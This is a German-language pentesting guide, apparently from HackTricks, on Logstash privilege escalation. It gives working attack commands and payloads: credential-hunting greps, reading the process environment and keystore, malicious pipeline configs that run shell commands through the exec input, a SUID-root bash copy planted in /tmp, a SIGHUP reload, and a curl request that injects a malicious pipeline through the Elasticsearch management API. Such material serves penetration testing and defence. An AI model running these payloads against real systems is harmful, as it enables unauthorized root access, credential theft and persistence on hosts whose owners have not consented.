# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash wird verwendet, um **Logs zu sammeln, zu transformieren und weiterzuleiten** über ein System, das als **pipelines** bekannt ist. Diese pipelines bestehen aus den Stufen **input**, **filter** und **output**. Ein interessanter Aspekt ergibt sich, wenn Logstash auf einem kompromittierten System läuft.

### Pipeline-Konfiguration

Pipelines werden in der Datei **/etc/logstash/pipelines.yml** konfiguriert, die die Speicherorte der Pipeline-Konfigurationen auflistet:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Diese Datei zeigt, wo die **.conf** Dateien, die Pipeline-Konfigurationen enthalten, abgelegt sind. Bei Verwendung eines **Elasticsearch output module** ist es üblich, dass **pipelines** **Elasticsearch credentials** enthalten, die oft umfangreiche Berechtigungen besitzen, weil Logstash Daten in Elasticsearch schreiben muss. Wildcards in den Konfigurationspfaden erlauben es Logstash, alle passenden pipelines im angegebenen Verzeichnis auszuführen.

Wenn Logstash mit `-f <directory>` statt mit `pipelines.yml` gestartet wird, werden **alle Dateien in diesem Verzeichnis in lexikographischer Reihenfolge aneinandergereiht und als eine einzige Konfiguration geparst**. Das hat zwei offensive Implikationen:

- Eine abgelegte Datei wie `000-input.conf` oder `zzz-output.conf` kann beeinflussen, wie die finale pipeline zusammengesetzt wird
- Eine fehlerhafte Datei kann verhindern, dass die gesamte pipeline geladen wird, validiere daher Payloads sorgfältig, bevor du dich auf auto-reload verlässt

### Schnelle Enumeration auf einem kompromittierten Host

Auf einem Host, auf dem Logstash installiert ist, schnell prüfen:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Überprüfe außerdem, ob die lokale Monitoring-API erreichbar ist. Standardmäßig bindet sie an **127.0.0.1:9600**, was nach dem Zugriff auf den Host normalerweise ausreicht:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dies liefert in der Regel Pipeline-IDs, Laufzeitdetails und die Bestätigung, dass Ihre modifizierte Pipeline geladen wurde.

Aus Logstash wiederhergestellte Zugangsdaten schalten häufig **Elasticsearch** frei, siehe [diese andere Seite über Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Um Privilege Escalation zu versuchen, identifizieren Sie zuerst den Benutzer, unter dem der Logstash-Dienst läuft, typischerweise der **logstash** Benutzer. Stellen Sie sicher, dass Sie **eine** der folgenden Voraussetzungen erfüllen:

- Schreibzugriff auf eine Pipeline **.conf** Datei besitzen **oder**
- Die Datei **/etc/logstash/pipelines.yml** verwendet ein Wildcard (Platzhalter), und Sie können in den Zielordner schreiben

Zusätzlich muss **eine** der folgenden Bedingungen erfüllt sein:

- Möglichkeit, den Logstash-Dienst neu zu starten **oder**
- Die Datei **/etc/logstash/logstash.yml** hat **config.reload.automatic: true** gesetzt

Wenn in der Konfiguration ein Wildcard vorhanden ist, ermöglicht das Erstellen einer Datei, die diesem Wildcard entspricht, die Ausführung von Befehlen. Zum Beispiel:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bestimmt **interval** die Ausführungsfrequenz in Sekunden. Im gezeigten Beispiel wird der **whoami**-Befehl alle 120 Sekunden ausgeführt, wobei seine Ausgabe an **/tmp/output.log** gesendet wird.

Mit **config.reload.automatic: true** in **/etc/logstash/logstash.yml** erkennt und übernimmt Logstash automatisch neue oder geänderte Pipeline-Konfigurationen, ohne dass ein Neustart erforderlich ist. Wenn kein Wildcard vorhanden ist, können Änderungen weiterhin an bestehenden Konfigurationen vorgenommen werden, allerdings ist Vorsicht geboten, um Störungen zu vermeiden.

### Zuverlässigere Pipeline Payloads

Das `exec` input plugin funktioniert auch in aktuellen Releases weiterhin und erfordert entweder ein `interval` oder ein `schedule`. Es führt aus, indem es die Logstash JVM durch **forking** abspaltet, sodass bei knappen Speicherressourcen dein payload mit `ENOMEM` fehlschlagen kann, anstatt stillschweigend zu laufen.

Ein praktischeres privilege-escalation payload ist in der Regel eines, das ein dauerhaftes Artefakt hinterlässt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Wenn Sie keine Rechte zum Neustart haben, aber den Prozess signalisieren können, unterstützt Logstash außerdem ein durch **SIGHUP** ausgelöstes Neuladen auf Unix-ähnlichen Systemen:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Beachte, dass nicht jedes Plugin reload-freundlich ist. Zum Beispiel verhindert das **stdin**-Input ein automatisches Neuladen, daher solltest du nicht davon ausgehen, dass `config.reload.automatic` immer deine Änderungen übernimmt.

### Geheimnisse aus Logstash stehlen

Bevor du dich ausschließlich auf Codeausführung konzentrierst, sammle die Daten, auf die Logstash bereits zugreifen kann:

- Klartext-Zugangsdaten sind oft in `elasticsearch {}`-outputs, `http_poller`, JDBC-Inputs oder cloudbezogenen Einstellungen hardkodiert
- Sichere Einstellungen können in **`/etc/logstash/logstash.keystore`** oder einem anderen `path.settings`-Verzeichnis liegen
- Das Keystore-Passwort wird häufig über **`LOGSTASH_KEYSTORE_PASS`** bereitgestellt, und paketbasierte Installationen beziehen es üblicherweise aus **`/etc/sysconfig/logstash`**
- Die Expansion von Environment-Variablen mit `${VAR}` wird beim Start von Logstash aufgelöst, daher lohnt sich eine Prüfung der Service-Umgebung

Nützliche Prüfungen:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Das ist ebenfalls überprüfenswert, da **CVE-2023-46672** gezeigt hat, dass Logstash unter bestimmten Umständen sensible Informationen in Logs aufzeichnen konnte. Auf einem Post-Exploitation-Host können daher alte Logstash-Logs und `journald`-Einträge Anmeldeinformationen offenbaren, selbst wenn die aktuelle Konfiguration das keystore referenziert, anstatt Geheimnisse inline zu speichern.

### Missbrauch zentralisierter Pipeline-Verwaltung

In manchen Umgebungen verlässt sich der Host überhaupt nicht auf lokale `.conf`-Dateien. Wenn **`xpack.management.enabled: true`** konfiguriert ist, kann Logstash zentral verwaltete Pipelines von Elasticsearch/Kibana ziehen, und nach dem Aktivieren dieses Modus sind lokale Pipeline-Konfigurationen nicht länger die Quelle der Wahrheit.

Das bedeutet einen anderen Angriffsweg:

1. Elastic credentials aus lokalen Logstash-Einstellungen, dem keystore oder aus Logs wiederherstellen
2. Überprüfen, ob das Konto das **`manage_logstash_pipelines`** Cluster-Privileg besitzt
3. Eine zentral verwaltete Pipeline erstellen oder ersetzen, sodass der Logstash-Host bei seinem nächsten Poll-Intervall Ihren Payload ausführt

Die für diese Funktion verwendete Elasticsearch-API ist:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dies ist besonders nützlich, wenn lokale Dateien schreibgeschützt sind, Logstash jedoch bereits registriert ist, um Pipelines aus der Ferne abzurufen.

## Referenzen

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
